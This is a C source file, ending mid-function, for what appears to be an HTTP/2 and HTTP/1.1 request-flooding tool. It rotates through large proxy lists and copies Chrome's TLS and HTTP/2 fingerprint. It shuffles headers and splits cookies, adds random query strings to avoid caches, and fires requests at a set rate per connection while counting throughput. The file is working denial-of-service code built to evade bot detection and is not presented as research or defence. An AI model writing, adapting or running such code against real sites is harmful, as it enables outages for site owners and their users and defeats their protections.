#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/tcp.h>
#include <sys/epoll.h>
#include <sys/time.h>
#include <string.h>
#include <pthread.h>
#include <sys/ptrace.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <signal.h>
#include "lshpack.h"
#include "xxhash.h"
#include <netdb.h>
#include <openssl/bio.h>
#include <openssl/ssl.h>
#include <brotli/decode.h>
#include <fcntl.h>
#include "base64.h"

int EPOLL_SIZE = 0;
int verbose = 0;
int flags = EPOLLET;
int counters = 0;
uint64_t updated_counters = 0;


static char page[100] = {0};

int send_counters = 0;
uint64_t send_updated_counters = 0;

#define LSHPACK_XXH_SEED 39378473
#define RESP_BUF_LEN 131072

int requestsInterval = 1000000;
int requests = 0;

char *full_arg;
char *username;
char *password;
int proxies = 0;
struct sockaddr_in addrs[100000] = {0};
int *proxyCounters = NULL;

int connect_http_len = 0;
char connect_http[1000] = {0};

static char ip[100] = {0}, *port = NULL;

struct __attribute__((__packed__)) frame
{
    uint32_t prepend;
    uint8_t flags;
    uint32_t stream;
};

struct __attribute__((__packed__)) setting
{
    uint16_t id;
    uint32_t value;
};

struct header
{
    char *name;
    char *value;
};

struct header headers[256];
int headers_length = 0;

struct epoll_info
{
    int index;
    int fd;
    int proxy;
    struct timespec start;
    int status;
    SSL *ssl;
    char *alpn;
    uint8_t magic_sent;
    uint64_t time;

    struct lshpack_enc henc;
    struct lshpack_dec hdec;
    uint32_t headers_sent;
    uint16_t header_payload_len;
    char *header_payload;
    struct frame recv_frame;
    uint32_t recv_f;
    char *payload;
    uint32_t recv_data;
    uint32_t window;
    uint32_t pending_streams;
    struct header headers[256];
    int headers_length;
};

void shuffle2(char *array[], size_t n)
{
    if (n > 1) 
    {
        size_t i;
        for (i = 0; i < n - 1; i++) 
        {
          size_t j = i + rand() / (RAND_MAX / (n - i) + 1);
          char* t = array[j];
          array[j] = array[i];
          array[i] = t;
        }
    }
}

void shuffle(struct header *array, size_t n)
{
    if (n > 1) 
    {
        size_t i;
        for (i = 0; i < n - 1; i++) 
        {
          size_t j = i + rand() / (RAND_MAX / (n - i) + 1);
          struct header t = array[j];
          array[j] = array[i];
          array[i] = t;
        }
    }
}

int Base64Encode(const char *message, char **buffer)
{ // Encodes a string to base64
    size_t l;
    *buffer = base64_encode(message, strlen(message), &l);
    return 0;
}

uint64_t mytime()
{
    struct timeval tv;
    gettimeofday(&tv, NULL);
    unsigned long time_in_micros = 1000000 * tv.tv_sec + tv.tv_usec;
    return time_in_micros;
}

void DumpHex(const void *data, size_t size)
{
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i)
    {
        printf("%02X ", ((const unsigned char *)data)[i]);
        if (((const unsigned char *)data)[i] >= ' ' && ((const unsigned char *)data)[i] <= '~')
        {
            ascii[i % 16] = ((const unsigned char *)data)[i];
        }
        else
        {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size)
        {
            printf(" ");
            if ((i + 1) % 16 == 0)
            {
                printf("|  %s \n", ascii);
            }
            else if (i + 1 == size)
            {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8)
                {
                    printf(" ");
                }
                for (j = (i + 1) % 16; j < 16; ++j)
                {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}

void reconnect(SSL_CTX *ctx, int efd, int threadId, struct epoll_info *info)
{

    //printf("RECON\n");

    int sockfd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
    if (sockfd < 0)
    {
        perror("socket");
        exit(1);
    }

    info->fd = sockfd;
    info->proxy = 0;
    info->status = 0;
    // SSL *ssl;
    /*if (info->alpn != NULL)
        free(info->alpn);*/
    info->magic_sent = 0;
    info->time = 0;

    // struct lshpack_enc henc;
    // struct lshpack_dec hdec;
    info->headers_sent = 0;
    info->header_payload_len = 0;
    if (info->header_payload != NULL)
    {
        free(info->header_payload);
        info->header_payload = NULL;
    }
    info->recv_f = 0;
    if (info->payload != NULL)
    {
        free(info->payload);
        info->payload = NULL;
    }
    info->recv_data = 0;
    info->window = 0;
    info->pending_streams = 0;
    memset(&info->headers, 0, sizeof(struct header) * 256);
    memcpy(&info->headers, headers, sizeof(struct header) * 256);
    info->headers_length = headers_length;

    clock_gettime(CLOCK_MONOTONIC_RAW, &info->start);
    struct epoll_event event;
    event.data.ptr = info;
    event.events = flags | EPOLLOUT;
    if (info->ssl != NULL)
    {
        // SSL_free(info->ssl);
    }
    info->ssl = SSL_new(ctx);
    SSL_set_alpn_protos(info->ssl, "\x02h2\x08http/1.1", 12);
    if (!SSL_has_application_settings(info->ssl))
    {
        SSL_add_application_settings(info->ssl, "h2", 2, NULL, 0);
    }
    // SSL_set_enable_ech_grease(ssl, 1);
    SSL_set_renegotiate_mode(info->ssl, ssl_renegotiate_explicit);
    SSL_set_tlsext_host_name(info->ssl, ip);
    SSL_set_early_data_enabled(info->ssl, 1);
    SSL_set_shed_handshake_config(info->ssl, 1);
    // SSL_set_permute_extensions(ssl, 1);
    SSL_set_fd(info->ssl, sockfd);
    SSL_set_connect_state(info->ssl);

    struct sockaddr_in addr = addrs[proxyCounters[threadId]];
    if (++proxyCounters[threadId] >= proxies)
    {
        proxyCounters[threadId] = 0;
    }
    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == -1)
    {
        if (errno == 115)
        {
            epoll_ctl(efd, EPOLL_CTL_ADD, sockfd, &event);
        }
        else
        {
            perror("connect");
            //exit(1);
        }
    }
    else
    {
        perror("connect");
        //exit(1);
    }
}

int DecompressBrotliCert(SSL *ssl,
                         CRYPTO_BUFFER **out,
                         size_t uncompressed_len,
                         const uint8_t *in,
                         size_t in_len)
{
    uint8_t *data;
    CRYPTO_BUFFER *decompressed = CRYPTO_BUFFER_alloc(&data, uncompressed_len);
    if (!decompressed)
    {
        return 0;
    }
    size_t output_size = uncompressed_len;
    if (BrotliDecoderDecompress(in_len, in, &output_size, data) !=
            BROTLI_DECODER_RESULT_SUCCESS ||
        output_size != uncompressed_len)
    {
        return 0;
    }
    *out = decompressed;
    return 1;
}

static void set_tcp_nodelay(int fd)
{
    int val = 1;
    int rv;
    rv = setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &val, (socklen_t)sizeof(val));
    if (rv == -1)
    {
        perror("setsockopt");
    }
}

static int
decode_and_check_hashes(struct lshpack_dec *dec,
                        const unsigned char **src, const unsigned char *src_end,
                        struct lsxpack_header *xhdr)
{
    uint32_t hash;
    int s;

    s = lshpack_dec_decode(dec, src, src_end, xhdr);
    if (s == 0)
    {
#if LSHPACK_DEC_CALC_HASH
        assert(xhdr->flags & LSXPACK_NAME_HASH);
#endif
        if (xhdr->flags & LSXPACK_NAME_HASH)
        {
            hash = XXH32(lsxpack_header_get_name(xhdr), xhdr->name_len,
                         LSHPACK_XXH_SEED);
            assert(hash == xhdr->name_hash);
        }

#if LSHPACK_DEC_CALC_HASH
        {
            /* This is not required by the API, but internally, if the library
             * calculates nameval hash, it should also set the name hash.
             */
            assert(xhdr->flags & LSXPACK_NAME_HASH);
            assert(xhdr->flags & LSXPACK_NAMEVAL_HASH);
        }
#endif

        if (xhdr->flags & LSXPACK_NAMEVAL_HASH)
        {
            hash = XXH32(lsxpack_header_get_name(xhdr), xhdr->name_len,
                         LSHPACK_XXH_SEED);
            hash = XXH32(lsxpack_header_get_value(xhdr), xhdr->val_len, hash);
            assert(hash == xhdr->nameval_hash);
        }
    }
    return s;
}

void
lsxpack_header_set_ptr(lsxpack_header_t *hdr,
                       const char *name, size_t name_len,
                       const char *val, size_t val_len)
{
    char buf[65535] = {0}; /* XXX be careful */
    memcpy(buf, name, name_len);
    memcpy(&buf[name_len], val, val_len);
    lsxpack_header_set_offset2(hdr, buf, 0, name_len, name_len, val_len);
}

const char *PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

int copy_frame(char *send_buf, struct frame h, const void *payload, int payload_len)
{
    int s = sizeof(h) + payload_len;
    memcpy(send_buf, &h, sizeof(h));
    memcpy(send_buf + sizeof(h), payload, payload_len);
    return s;
}

int send_frame(struct epoll_info *ev_info, struct frame h, const void *payload, int payload_len)
{
    int s = sizeof(h) + payload_len;
    char send_buff[65535] = {0};
    memcpy(send_buff, &h, sizeof(h));
    memcpy(send_buff + sizeof(h), payload, payload_len);
    // printf("%p %p %p\n", ssl, send_buff, &s);
    //DumpHex(send_buff, 9);
    int r = SSL_write(ev_info->ssl, send_buff, s);
    if (r <= 0)
    {
        ev_info->status = 0;
        printf("send_frame error %i\n", SSL_get_error(ev_info->ssl, r));
        shutdown(ev_info->fd, SHUT_RDWR);
    }
    return r;
}

void settings_entry(char *settings, int i, struct setting s)
{
    memcpy(settings + i * 6, &s, 6);
}

char *strtokm(char *str, const char *delim)
{
    static char *tok;
    static char *next;
    char *m;

    if (delim == NULL)
        return NULL;

    tok = (str) ? str : next;
    if (tok == NULL)
        return NULL;

    m = strstr(tok, delim);

    if (m)
    {
        next = m + strlen(delim);
        *m = '\0';
    }
    else
    {
        next = NULL;
    }

    return tok;
}

void status1(int efd, struct epoll_event ev, struct epoll_info *ev_info)
{
    if (ev_info->ssl == NULL || strcmp(ev_info->alpn, "h2") != 0)
    {

        //printf("%p %s\n", ev_info->ssl, ev_info->alpn);

        if (ev.events & EPOLLOUT)
        {
            if (mytime() - ev_info->time > requestsInterval / requests)
            {
                ev_info->time = mytime();

                char request[1000] = {0};
                strcat(request, "GET ");
                strcat(request, "/");
                strcat(request, " HTTP/1.1\r\n");

                strcat(request, "Host");
                strcat(request, ": ");
                strcat(request, ip);
                strcat(request, "\r\n");

                for (int ii = 0; ii < ev_info->headers_length; ii++)
                {
                    strcat(request, ev_info->headers[ii].name);
                    strcat(request, ": ");
                    strcat(request, ev_info->headers[ii].value);
                    strcat(request, "\r\n");
                }

                strcat(request, "\r\n");
                int err;

                if (ev_info->ssl)
                    err = SSL_write(ev_info->ssl, request, (int)strlen(request));
                else
                    err = send(ev_info->fd, request, strlen(request), 0);

                if (err < 0)
                    printf("%i ERR\n", err);
            }
            if (ev.events & EPOLLIN)
            {
                char hbuf[65535];
                int hr;
                if (ev_info->ssl)
                    hr = SSL_read(ev_info->ssl, hbuf, 65535);
                else
                    hr = recv(ev_info->fd, hbuf, 65535, 0);

                if (hr <= 0)
                {
                    if (ev_info->ssl)
                    {
                        printf("%i HR\n", SSL_get_error(ev_info->ssl, hr));
                        if (hr == SSL_ERROR_WANT_READ)
                        {
                        }
                    }
                    else
                        printf("%i RECV\n", hr);
                }

                if (hr > 0)
                {
                    // DumpHex(hbuf, hr);
                }
            }
        }
        shutdown(ev_info->fd, SHUT_RDWR);
    }

    // printf("%i ev_info->status\n", ev_info->status);

    if (!ev_info->magic_sent)
    {
        // printf("MAGIC\n");
        if (ev.events & EPOLLOUT)
        {

            char magic[256] = {0};
            char settings[24] = {0};
            memcpy(magic, PREFACE, 24);
            int offset = 24;

            settings_entry(settings, 0, (struct setting){htons(1), htonl(65536)});
            settings_entry(settings, 1, (struct setting){htons(3), htonl(1000)});
            settings_entry(settings, 2, (struct setting){htons(4), htonl(6291456)});
            settings_entry(settings, 3, (struct setting){htons(6), htonl(262144)});

            struct frame settings_frame;
            settings_frame.prepend = htonl(0x00001804);
            settings_frame.flags = 0;
            settings_frame.stream = 0;
            offset += copy_frame(magic + offset, settings_frame, settings, 24);

            struct frame window_frame;
            window_frame.prepend = htonl(0x00000408);
            window_frame.flags = 0;
            window_frame.stream = 0;
            int update_window = htonl(15663105);
            offset += copy_frame(magic + offset, window_frame, &update_window, 4);

            //DumpHex(magic, offset);*/

            int rv = SSL_write(ev_info->ssl, magic, offset);

            /*char settings[24] = {0};

            settings_entry(settings, 0, (struct setting){htons(1), htonl(65535)});
            settings_entry(settings, 1, (struct setting){htons(3), htonl(1000)});
            settings_entry(settings, 2, (struct setting){htons(4), htonl(6291456)});
            settings_entry(settings, 3, (struct setting){htons(6), htonl(262144)});

            struct frame settings_frame;
            settings_frame.prepend = htonl(0x00001804);
            settings_frame.flags = 0;
            settings_frame.stream = 0;

            struct frame window_frame;
            window_frame.prepend = htonl(0x00000408);
            window_frame.flags = 0;
            window_frame.stream = 0;
            DumpHex(&window_frame, 9);
            int update_window = htonl(15663105);

            rv += send_frame(ev_info, settings_frame, settings, 24);
            rv += send_frame(ev_info, window_frame, &update_window, 4);*/
            if (rv > 0)
            {
                ev_info->recv_data += rv;
                if (1)
                {
                    //printf("%i\n", rv);
                    ev_info->recv_data = 0;
                    ev_info->magic_sent = 1;
                    assert(ev_info->recv_f == 0);
                }
            }
            else
            {
                if (rv == 1)
                {
                    // reconnect(addr, efd, infos, ctx, ev_info->i);
                }
                rv = SSL_get_error(ev_info->ssl, rv);
                if (rv != 2)
                {
                    ev_info->ssl = NULL;
                }
                shutdown(ev_info->fd, SHUT_RDWR);
                ev_info->status = 0;
            }
            // printf("RV %i\n", rv);
        }
    }
    else if (ev.events & EPOLLOUT)
    {
        ev_info->status = 2;
        /*
        1: 65535,
        3: 1000,
        4: 6291456,
        6: 262144
        */

        //printf("init\n");

        char respBuf[RESP_BUF_LEN] = {0};
        char *pBuf = respBuf;

        lshpack_enc_init(&ev_info->henc);
        lshpack_dec_init(&ev_info->hdec);
        lshpack_dec_set_max_capacity(&ev_info->hdec, 64);
        lshpack_enc_set_max_capacity(&ev_info->henc, 256);

        lsxpack_header_t hdr;

        // printf("Page: %s\n", page);
        // printf("IP: %s\n", ip);

        lsxpack_header_set_ptr(&hdr, ":method", 7, "GET", 3);
        pBuf = lshpack_enc_encode(&ev_info->henc, pBuf, respBuf + RESP_BUF_LEN, &hdr);

        lsxpack_header_set_ptr(&hdr, ":authority", 10, ip, strlen(ip));
        pBuf = lshpack_enc_encode(&ev_info->henc, pBuf, respBuf + RESP_BUF_LEN, &hdr);

        lsxpack_header_set_ptr(&hdr, ":scheme", 7, "https", 5);
        pBuf = lshpack_enc_encode(&ev_info->henc, pBuf, respBuf + RESP_BUF_LEN, &hdr);

        lsxpack_header_set_ptr(&hdr, ":path", 5, page, strlen(page));
        pBuf = lshpack_enc_encode(&ev_info->henc, pBuf, respBuf + RESP_BUF_LEN, &hdr);

        shuffle(ev_info->headers, ev_info->headers_length);

        int chromeVer = 100 + (rand() % 10);

        for (int ii = 0; ii < ev_info->headers_length; ii++)
        {
            if (!strcmp(ev_info->headers[ii].name, "cookie"))
            {
                char *cookieHeader = strdup(ev_info->headers[ii].value);
                char *cookieV = strtokm(cookieHeader, "; ");
                while (cookieV != NULL)
                {
                    lsxpack_header_set_ptr(&hdr, ev_info->headers[ii].name, strlen(ev_info->headers[ii].name), cookieV, strlen(cookieV));
                    pBuf = lshpack_enc_encode(&ev_info->henc, pBuf, respBuf + RESP_BUF_LEN, &hdr);
                    cookieV = strtokm(NULL, "; ");
                }
                free(cookieHeader);
                continue;
            }
            //if (!strcmp(ev_info->headers[ii].name, "user-agent")) {
            //    char userAgent[256] = { 0 };
             //   sprintf(userAgent, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36", chromeVer, 1024 + rand() % 2048, 10 + rand() % 74);
                //lsxpack_header_set_ptr(&hdr, ev_info->headers[ii].name, strlen(ev_info->headers[ii].name), userAgent, strlen(userAgent));
                //pBuf = lshpack_enc_encode(&ev_info->henc, pBuf, respBuf + RESP_BUF_LEN, &hdr);
                //continue;
            //    ev_info->headers[ii].value = strdup(userAgent);
            //}
            /*if (!strcmp(ev_info->headers[ii].name, "sec-ch-ua")) {
                char secChUa[256] = { 0 };
                sprintf(secChUa, "\" Not A;Brand\";v=\"24\", \"Chromium\";v=\"%d\", \"Google Chrome\";v=\"%d\"", chromeVer, chromeVer);
                ev_info->headers[ii].value = strdup(secChUa);
            }*/
            lsxpack_header_set_ptr(&hdr, ev_info->headers[ii].name, strlen(ev_info->headers[ii].name), ev_info->headers[ii].value, strlen(ev_info->headers[ii].value));
            pBuf = lshpack_enc_encode(&ev_info->henc, pBuf, respBuf + RESP_BUF_LEN, &hdr);
        }

        /*for (int ii = 0; ii < 1; ii++)
        {
            char name[5];
            char value[5];
            for (int j = 0; j < 5; j++)
            {
                name[j] = 97 + (rand() % 24);
            }
            name[5] = 0;
            for (int j = 0; j < 5; j++)
            {
                value[j] = 97 + (rand() % 24);
            }
            value[5] = 0;

            lsxpack_header_set_ptr(&hdr, name, 5, value, 5);
            pBuf = lshpack_enc_encode(&ev_info->henc, pBuf, respBuf + RESP_BUF_LEN, &hdr);
        }*/

        uint16_t header_payload_len = ((uint16_t)(pBuf - respBuf)) + 5;
        char *header_payload = malloc(header_payload_len);
        memset(header_payload + 5, 0, header_payload_len - 5);
        memcpy(header_payload + 5, respBuf, header_payload_len - 5);
        //DumpHex(header_payload, header_payload_len - 5);
        header_payload[0] = 0x80;
        header_payload[1] = 0x00;
        header_payload[2] = 0x00;
        header_payload[3] = 0x00;
        header_payload[4] = 0xFF;
        //DumpHex(header_payload, header_payload_len);

        ev_info->header_payload = header_payload;
        ev_info->header_payload_len = header_payload_len;

        for (int ij = 0; ij < 1; ij++)
        {
            struct frame headers_frame;
            headers_frame.prepend = htonl(ev_info->header_payload_len << 8) | htonl(0x01);
            headers_frame.flags = 1 | 4 | 0x20;
            headers_frame.stream = htonl(ev_info->headers_sent * 2 + 1);
            //printf("%i HEADER\n", header_payload_len);
            send_frame(ev_info, headers_frame, header_payload, header_payload_len);
            ev_info->headers_sent++;
        }
        ev_info->time = mytime();
        struct epoll_event ev;
        ev.data.ptr = ev_info;
        ev.events = flags | EPOLLIN | EPOLLOUT;
        epoll_ctl(efd, EPOLL_CTL_MOD, ev_info->fd, &ev);

        //printf("INFO->TIME %i\n", ev_info->status);
    }
}

void status2(int efd, struct epoll_event ev, struct epoll_info *ev_info)
{


    if (ev.events & EPOLLIN)
    {

        if (ev_info->recv_f < 9)
        {
            if (ev_info->recv_data != 0)
                printf("ERROR %i %p\n", ev_info->recv_data, ev_info->payload);
            assert(ev_info->payload == NULL);
            assert(ev_info->recv_data == 0);
            int rcvd = SSL_read(ev_info->ssl, (void *)(&ev_info->recv_frame) + ev_info->recv_f, 9 - ev_info->recv_f);
            //printf("%i\n", rcvd);
            if (rcvd <= 0)
            {
                int rs = SSL_get_error(ev_info->ssl, rcvd);
                if (rs == SSL_ERROR_WANT_READ || rs == SSL_ERROR_WANT_WRITE || rs == SSL_ERROR_ZERO_RETURN)
                {
                    
                }
                else
                {
                    printf("F %i\n", rs);
                    shutdown(ev_info->fd, SHUT_RDWR);
                    ev_info->status = 0;
                }
                /*epoll_ctl(efd, EPOLL_CTL_DEL, ev_info->fd, NULL);
                shutdown(ev_info->fd, SHUT_RDWR);
                close(ev_info->fd);
                if (rs != 5 && rs != 1)
                {
                    if (SSL_clear(ev_info->ssl) != 1)
                    {
                        printf("ERR Fа %i\n", rs);
                        assert(SSL_clear(ev_info->ssl) == 1);
                    }
                }
                ev_info->fd = 0;*/
            }
            else
            {
                ev_info->recv_f += rcvd;
            }
        }
        if (ev_info->recv_f == 9)
        {
            uint8_t type = htonl(ev_info->recv_frame.prepend) & 0xFF;
            uint32_t length = htonl(ev_info->recv_frame.prepend << 8);

            if (verbose == 2)
            {
                printf("Headers sent %i Received frame len=%i type=%02x\n", ev_info->headers_sent, length, type);
            }
            if (type > 9)
            {
                printf("Headers sent %i Received frame len=%i type=%02x\n", ev_info->headers_sent, length, type);
                shutdown(ev_info->fd, SHUT_RDWR);
            }
            if (length != 0)
            {
                int recv_frame_len = length;
                int error = 0;
                if (ev_info->recv_data == 0)
                {
                    ev_info->payload = (char *)malloc(recv_frame_len);
                    memset(ev_info->payload, 0, recv_frame_len);
                }

                // printf("recv data %p %i %i\n\n\n", ev_info->payload, recv_frame_len, ev_info->recv_data);
                int rrrrr = SSL_read(ev_info->ssl, ev_info->payload + ev_info->recv_data, recv_frame_len - ev_info->recv_data);
                if (rrrrr <= 0)
                {
                    rrrrr = SSL_get_error(ev_info->ssl, rrrrr);
                    if (rrrrr != SSL_ERROR_WANT_READ) {
                        printf("Error got %i\n", rrrrr);
                        ev_info->ssl = NULL;
                        shutdown(ev_info->fd, SHUT_RDWR);
                        free(ev_info->payload);
                        ev_info->payload = NULL;
                        ev_info->status = 0;
                        return;
                    }
                }
                else
                {
                    ev_info->recv_data += rrrrr;

                    if (ev_info->recv_data != recv_frame_len)
                    {
                        assert(ev_info->recv_data < recv_frame_len);
                    }
                    else
                    {
                        ev_info->recv_f = 0;
                        ev_info->recv_data = 0;
                        if (type == 0)
                        {
                            // write(1, ev_info->payload, recv_frame_len);
                        }
                        if (type == 1)
                        {

                            counters++;
                            if (mytime() - updated_counters > 1000000)
                            {
                                updated_counters = mytime();
                                printf("Counters: %i\n", counters);
                                counters = 0;
                            }

                            char *pSrc = ev_info->payload;
                            char *bufEnd = ev_info->payload + recv_frame_len;
                            // DumpHex(pSrc, recv_frame_len);

                            int rc;
                            char out[65535 * 2] = {0};
                            lsxpack_header_t hdr;
                            while (pSrc < bufEnd)
                            {
                                lsxpack_header_prepare_decode(&hdr, out, 0, sizeof(out));
                                rc = decode_and_check_hashes(&ev_info->hdec, (const unsigned char **)&pSrc, bufEnd, &hdr);
                                if (rc != 0)
                                {
                                    printf("Failde decode %i\n", rc);
                                    error = 1;
                                    break;
                                }
                                char *name = out;
                                char *val = hdr.buf + hdr.val_offset;

                                char nn[hdr.name_len + 1];
                                nn[hdr.name_len] = 0;
                                memcpy(nn, name, hdr.name_len);

                                char vv[hdr.val_len + 1];
                                vv[hdr.val_len] = 0;
                                memcpy(vv, val, hdr.val_len);

                                if (!strcmp(nn, "set-cookie") && 0)
                                {
                                    char cookieJar[10240] = {0};
                                    char *newCookieEntry = strtok(vv, ";");
                                    char *newCookieName = strtok(newCookieEntry, "=");
                                    char *newCookieVal = strtok(NULL, "=");

                                    for (int j = 0; j < ev_info->headers_length; j++)
                                    {
                                        if (!strcmp(ev_info->headers[j].name, "cookie"))
                                        {
                                            char *cookieHeader = strdup(ev_info->headers[j].value);
                                            int k = 0;
                                            int found = 0;

                                            char *cookieEntry = strtokm(cookieHeader, "; ");
                                            while (cookieEntry != NULL)
                                            {
                                                if (k > 0)
                                                {
                                                    cookieEntry = strtokm(NULL, "; ");
                                                    if (cookieEntry == NULL)
                                                        break;
                                                    strcat(cookieJar, "; ");
                                                }
                                                char *cookieName = strtok(cookieEntry, "=");
                                                if (cookieName == NULL)
                                                {
                                                    break;
                                                }
                                                char *cookieVal = strtok(NULL, "=");
                                                if (!strcmp(newCookieName, cookieName))
                                                {
                                                    if (!found)
                                                    {
                                                        found = 1;
                                                        strcat(cookieJar, newCookieName);
                                                        strcat(cookieJar, "=");
                                                        if (newCookieVal != NULL)
                                                            strcat(cookieJar, newCookieVal);
                                                    }
                                                }
                                                else if (cookieVal != NULL)
                                                {
                                                    strcat(cookieJar, cookieName);
                                                    strcat(cookieJar, "=");
                                                    strcat(cookieJar, cookieVal);
                                                }
                                                k++;
                                            }

                                            char entCookie[100] = {0};

                                            strcat(entCookie, newCookieName);
                                            strcat(entCookie, "=");
                                            if (newCookieVal != NULL)
                                                strcat(entCookie, newCookieVal);
                                            // printf("NEW COOKIE ENT %s\n", entCookie);

                                            if (!found)
                                            {
                                                strcat(cookieJar, "; ");
                                                strcat(cookieJar, entCookie);
                                            }
                                            free(cookieHeader);
                                            free(ev_info->headers[j].value);
                                            ev_info->headers[j].value = strdup(cookieJar);
                                            // if (verbose)
                                            //     printf("NEW COOKIE %s\n", cookieJar);
                                            break;
                                        }
                                    }

                                    free(ev_info->header_payload);
                                    ev_info->header_payload = NULL;
                                    
                                    lshpack_enc_cleanup(&ev_info->henc);
                                    memset(&ev_info->henc, 0, sizeof(ev_info->henc));
                                    lshpack_enc_init(&ev_info->henc);

                                    char respBuf[RESP_BUF_LEN] = {0};
                                    char *pBuf = respBuf;

                                    lsxpack_header_t hdr2;

                                    lsxpack_header_set_ptr(&hdr2, ":method", 7, "GET", 3);
                                    pBuf = lshpack_enc_encode(&ev_info->henc, pBuf, respBuf + RESP_BUF_LEN, &hdr2);

                                    lsxpack_header_set_ptr(&hdr2, ":authority", 10, ip, strlen(ip));
                                    pBuf = lshpack_enc_encode(&ev_info->henc, pBuf, respBuf + RESP_BUF_LEN, &hdr2);

                                    lsxpack_header_set_ptr(&hdr2, ":scheme", 7, "https", 5);
                                    pBuf = lshpack_enc_encode(&ev_info->henc, pBuf, respBuf + RESP_BUF_LEN, &hdr2);

                                    char pageQuery[14] = { 0 };
                                    pageQuery[0] = '?';
                                    for (int ii = 1 ; ii < 12; ii++) {
                                        pageQuery[ii] = 97 + (rand() % 24);
                                    }

                                    char pagee[100] = { 0 };
                                    strcpy(pagee, page);
                                    strcat(pagee, pageQuery);
                                    

                                    lsxpack_header_set_ptr(&hdr2, ":path", 5, pagee, strlen(pagee));
                                    pBuf = lshpack_enc_encode(&ev_info->henc, pBuf, respBuf + RESP_BUF_LEN, &hdr2);

                                    for (int ii = 0; ii < ev_info->headers_length; ii++)
                                    {
                                        if (!strcmp(ev_info->headers[ii].name, "cookie"))
                                        {
                                            char *cookieHeader = strdup(ev_info->headers[ii].value);
                                            char *cookieV = strtokm(cookieHeader, "; ");
                                            while (cookieV != NULL)
                                            {
                                                lsxpack_header_set_ptr(&hdr, ev_info->headers[ii].name, strlen(ev_info->headers[ii].name), cookieV, strlen(cookieV));
                                                pBuf = lshpack_enc_encode(&ev_info->henc, pBuf, respBuf + RESP_BUF_LEN, &hdr);
                                                cookieV = strtokm(NULL, "; ");
                                            }
                                            free(cookieHeader);
                                            continue;
                                        }
                                        lsxpack_header_set_ptr(&hdr, ev_info->headers[ii].name, strlen(ev_info->headers[ii].name), ev_info->headers[ii].value, strlen(ev_info->headers[ii].value));
                                        pBuf = lshpack_enc_encode(&ev_info->henc, pBuf, respBuf + RESP_BUF_LEN, &hdr);
                                    }

                                    /*for (int ii = 0; ii < 1; ii++)
                                    {
                                        char nameF[5];
                                        char valueF[5];
                                        for (int j = 0; j < 5; j++)
                                        {
                                            nameF[j] = 97 + (rand() % 24);
                                        }
                                        nameF[5] = 0;
                                        for (int j = 0; j < 5; j++)
                                        {
                                            valueF[j] = 97 + (rand() % 24);
                                        }
                                        valueF[5] = 0;

                                        lsxpack_header_set_ptr(&hdr, nameF, 5, valueF, 5);
                                        pBuf = lshpack_enc_encode(&ev_info->henc, pBuf, respBuf + RESP_BUF_LEN, &hdr);
                                    }*/

                                    uint16_t header_payload_len = (uint16_t)(pBuf - respBuf);
                                    char *header_payload = malloc(header_payload_len);
                                    memset(header_payload, 0, header_payload_len);
                                    memcpy(header_payload, respBuf, header_payload_len);

                                    ev_info->header_payload = header_payload;
                                    ev_info->header_payload_len = header_payload_len;
                                }

                                if (strstr(name, ":status"))
                                {

                                    if (verbose == 1)
                                        printf("%.*s: %.*s\n", hdr.name_len, name, hdr.val_len, val);
                                }
                            }
                        }

                        // printf("XXX\n");
                        ev_info->recv_f = 0;

                        if (type == 3)
                        {
                            printf("Reset %i\n", htonl(*(int *)ev_info->payload));
                        }
                        if (type == 8)
                        {
                            //printf("WINDOW X\n");
                            ev_info->window = (*(int *)ev_info->payload);
                            //printf("WINDOW %d\n", htonl(ev_info->window));
                        }

                        if (type == 7 || type == 3)
                        {
                            shutdown(ev_info->fd, SHUT_RDWR);
                            ev_info->status = 0;
                            printf("REc %i\n", type);
                            DumpHex(ev_info->payload, recv_frame_len);
                            /*int sr = SSL_shutdown(ev_info->ssl);
                            if (sr <= 0) {
                                printf("X %i\n", sr);
                            } else {
                                reconnect(addr, efd, infos, ctx, ev_info->i);
                            }*/
                        }

                        free(ev_info->payload);
                        ev_info->payload = NULL;
                        if (error)
                        {
                            ev_info->recv_f = 0;
                        }

                        ev_info->recv_f = 0;

                        //printf("FRAME %i %i\n", type, ev_info->recv_frame.flags);

                        if (type == 4 && ev_info->recv_frame.flags & 1)
                        {
                            struct frame settings_frame;
                            settings_frame.prepend = htonl(0x00000004);
                            settings_frame.flags = 1;
                            settings_frame.stream = 0;
                            send_frame(ev_info, settings_frame, NULL, 0);
                        }
                        if (type == 8)
                        {
                            struct frame window_frame;
                            window_frame.prepend = htonl(0x00000408);
                            window_frame.flags = 0;
                            window_frame.stream = 0;
                            int update_window = htonl(15663105);
                            // offset += copy_frame(magic + offset, window_frame, &update_window, 4);
                            //send_frame(ev_info, window_frame, &update_window, 4);
                        }
                        if ((type == 1 || type == 0) && flags & 1)
                        {
                            ev_info->pending_streams--;
                        }
                    }
                }
            }
            else
            {
                //printf("FRAME X %i %i\n", type, ev_info->recv_frame.flags);

                if (type == 4 && ev_info->recv_frame.flags & 1)
                {
                    struct frame settings_frame;
                    settings_frame.prepend = htonl(0x00000004);
                    settings_frame.flags = 1;
                    settings_frame.stream = 0;
                    send_frame(ev_info, settings_frame, NULL, 0);
                }
                ev_info->recv_f = 0;
            }
        }
        else if (ev_info->recv_f > 9)
        {
            printf("BANZAI %i\n", ev_info->recv_f);
        }
        //printf("%i %i epoll end\n", ev_info->recv_f, ev_info->recv_data);
    }

    if (ev.events & EPOLLOUT)
    {
        if (mytime() - ev_info->time > 1000000 / requests)
        {
            ev_info->time = mytime();
            for (int ij = 0; ij < 1; ij++)
            {

                /*if ((ev_info->headers_sent - 1) * 2 + 1 > 0) {
                    struct frame rst_frame;
                    rst_frame.zero = 0;
                    rst_frame.length = htons(4);
                    rst_frame.type = 3;
                    rst_frame.flags = 0;
                    rst_frame.stream = htonl((ev_info->headers_sent - 1) * 2 + 1);
